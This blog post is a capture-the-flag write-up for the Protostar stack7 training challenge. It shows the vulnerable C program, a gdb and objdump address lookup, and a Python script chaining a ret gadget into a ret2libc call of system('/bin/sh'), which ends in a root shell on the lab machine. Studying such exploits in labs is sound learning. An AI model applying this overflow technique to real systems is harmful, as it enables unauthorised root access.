---
layout: post
title: "Protostar stack07 writeup"
tags: [protostar]
comments: false
---


We are given a source code for this challenge.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

differing from stack06 we can't just use ret2libc technique because of these lines of codes since the libc address is 0xb7e97000 it will just exit out of the program

```
  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }
```

So what I thought was, what if I just ret and exit out of the function and then to the ret2libc and this could be possible because the ret instruction's address was in 

```
user@protostar:/opt/protostar/bin$ objdump -D stack7 | grep ret
 8048383:       c3                      ret  
```

so the exploit will look like

```
offset+ret address +sys+exit+/bin/bash address
```

offset is 80 and we can know that from the previous stack06 cahllegne

system&exit address
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
(gdb) 
```

/bin/bash address
```
user@protostar:/opt/protostar/bin$ strings -t d  /lib/libc.so.6  | grep /bin/sh
1176511 /bin/sh
```

so the exploit code will be 
```
user@protostar:/opt/protostar/bin$ cat /tmp/exploit.py 
import struct

base = "A"*80
ret = struct.pack("I", 0x8048383)
sys = struct.pack("I", 0xb7ecffb0)
exit = struct.pack("I",0xb7ec60c0)
bash = struct.pack("I", 0xb7e97000+0x11f3bf)

exploit = base+ret+sys+exit+bash

print exploit
```

run it
```
user@protostar:/opt/protostar/bin$ (python /tmp/exploit.py;cat) | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA������`췿c��
whoami
root
```